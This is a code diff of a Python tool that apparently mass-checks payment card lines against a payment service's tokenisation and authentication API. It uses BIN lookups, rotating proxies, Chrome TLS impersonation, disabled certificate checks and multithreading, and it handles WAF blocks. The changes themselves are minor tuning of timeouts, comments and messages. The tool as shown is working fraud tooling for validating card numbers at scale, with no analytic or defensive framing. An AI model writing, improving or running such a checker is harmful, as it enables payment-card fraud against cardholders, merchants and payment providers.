@@ -119,7 +119,6 @@ def resolve_bin_info(bin_code):
     if bin_code in bin_server_cache:
         return bin_server_cache[bin_code]
 
-    # Provider 1: HandyAPI (High Rate Limit + Accurate Issuer)
     try:
         r1 = requests.get(f"https://data.handyapi.com/bin/{bin_code}", timeout=4)
         if r1.status_code == 200:
@@ -141,7 +140,6 @@ def resolve_bin_info(bin_code):
     except Exception:
         pass
 
-    # Provider 2: Bincheck.io
     try:
         r2 = requests.get(f"https://api.bincheck.io/v1/{bin_code}", timeout=4)
         if r2.status_code == 200:
@@ -164,7 +162,6 @@ def resolve_bin_info(bin_code):
     except Exception:
         pass
 
-    # Provider 3: Binlist.net
     try:
         r3 = requests.get(f"https://lookup.binlist.net/{bin_code}", headers={'Accept-Version': '3'}, timeout=4)
         if r3.status_code == 200:
@@ -636,7 +633,7 @@ class DynamicTokenManager:
             proxy_str = p_dict["http"] if p_dict else None
         try:
             req_session = session if session else cffi_requests.Session(impersonate="chrome")
-            resp = req_session.post(url, json=body, headers=headers, proxy=proxy_str, timeout=10, verify=False)
+            resp = req_session.post(url, json=body, headers=headers, proxy=proxy_str, timeout=8, verify=False)
             if resp.status_code == 200:
                 data = resp.json()
                 new_token = data.get("access_token")
@@ -649,7 +646,7 @@ class DynamicTokenManager:
 
 def test_proxy(proxy_dict):
     try:
-        r = requests.get("https://api.ipify.org?format=json", proxies=proxy_dict, timeout=5, verify=False)
+        r = requests.get("https://api.ipify.org?format=json", proxies=proxy_dict, timeout=4, verify=False)
         return r.status_code == 200
     except Exception:
         return False
@@ -738,11 +735,11 @@ def check_single_card(card_line, proxy_pool, token_manager):
             f"{TOKENISATION_BASE}/api/v1/tokenisation/public-keys", 
             headers=headers, 
             proxy=proxy_str,
-            timeout=10,
+            timeout=8,
             verify=False
         )
         if r.status_code != 200:
-            return 2, "ERROR", f"HTTP {r.status_code} (Cloudflare 403 / WAF Block)"
+            return 2, "ERROR", f"HTTP {r.status_code} (WAF Block)"
         
         keys = r.json().get("list", [])
         if not keys:
@@ -768,7 +765,7 @@ def check_single_card(card_line, proxy_pool, token_manager):
                 "save_card": False
             },
             proxy=proxy_str,
-            timeout=10,
+            timeout=8,
             verify=False
         )
         
@@ -789,7 +786,7 @@ def check_single_card(card_line, proxy_pool, token_manager):
             f"{TOKENISATION_BASE}/api/v1/tokenisation/authenticate/{auth_id}",
             headers=headers,
             proxy=proxy_str,
-            timeout=10,
+            timeout=8,
             verify=False
         )
         
@@ -809,7 +806,7 @@ def check_single_card(card_line, proxy_pool, token_manager):
 
     except Exception as e:
         err_msg = str(e).encode('ascii', 'ignore').decode('ascii')
-        return 2, "ERROR", err_msg or "Exception"
+        return 2, "ERROR", err_msg[:50] or "Timeout"
     finally:
         try:
             session.close()
@@ -838,7 +835,7 @@ def background_worker(cards, proxies_list, max_threads):
                 valid_proxies.append(p_str)
         
         proxy_pool = WebProxyPool(valid_proxies) if valid_proxies else None
-        checker_queue.put({"status_msg": f"Proxy check complete: {len(valid_proxies)}/{total_proxies} active. Starting threads..."})
+        checker_queue.put({"status_msg": f"Proxy check complete: {len(valid_proxies)} active. Starting..."})
     else:
         proxy_pool = None
         checker_queue.put({"status_msg": "Running in multi-threaded proxyless mode..."})
@@ -874,9 +871,9 @@ def background_worker(cards, proxies_list, max_threads):
                 **counts
             })
 
-    with ThreadPoolExecutor(max_workers=max_threads) as executor:
+    with ThreadPoolExecutor(max_workers=max(1, int(max_threads))) as executor:
         futures = [executor.submit(worker_task, card) for card in cards]
-        for _ in as_completed(futures):
+        for future in as_completed(futures):
             if checker_stop_event.is_set():
                 break
 
